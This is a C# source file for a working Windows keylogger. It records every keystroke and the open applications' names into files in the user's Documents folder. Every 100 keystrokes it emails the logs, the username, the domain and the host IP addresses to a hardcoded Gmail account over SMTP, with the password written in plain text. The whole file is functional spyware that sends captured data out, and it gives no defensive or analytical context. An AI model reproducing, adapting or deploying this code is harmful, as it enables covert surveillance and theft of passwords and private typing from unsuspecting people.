using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;

namespace test1
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long numberOfKeysPressed = 0;
        static void Main(string[] args)
        {
            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            //if(!Directory.Exists(filepath))
            //Directory.CreateDirectory(filepath);

            string pathKeys = (filepath + @"\keystrokes.txt");
            if (!File.Exists(pathKeys))
                using (StreamWriter sw = File.CreateText(pathKeys)) ;
            string pathProcesses = (filepath + @"\processes.txt");
            if (!File.Exists(pathProcesses))
                using (StreamWriter sw = File.CreateText(pathProcesses)) ;

            while (true)
            {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        using (StreamWriter sw = File.AppendText(pathKeys))
                        {
                            sw.Write((char)i);
                        }
                        numberOfKeysPressed++;
                        if (numberOfKeysPressed % 100 == 0)
                        {
                            File.WriteAllText(pathProcesses, string.Empty);
                            Process[] processes = Process.GetProcesses();
                            foreach (Process p in processes)
                            {
                                if (!String.IsNullOrEmpty(p.MainWindowTitle))
                                {
                                    using (StreamWriter sw = File.AppendText(pathProcesses))
                                    {
                                        sw.WriteLine(FileVersionInfo.GetVersionInfo(p.MainModule.FileName).FileDescription);
                                    }
                                }
                            }
                            SendNewMessage();
                        }
                    }
                }
            }
        }

        static void SendNewMessage()
        {
            string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePathKeys = folderName + @"\keystrokes.txt";
            string filePathProcesses = folderName + @"\processes.txt";
            string logContents = File.ReadAllText(filePathKeys);
            string processes = File.ReadAllText(filePathProcesses);

            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";
            string emailBody = "";

            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var address in host.AddressList)
            {
                emailBody += "\nAddress: " + address;
            }
            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\n Time: " + now.ToString();
            emailBody += "\n Open apps: " + processes;
            emailBody += "\n Keys pressed: " + logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("testkeyloggerapp@gmail.com");
            mailMessage.To.Add("testkeyloggerapp@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("testkeyloggerapp@gmail.com", "parolatest1234");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);

        }
    }
}
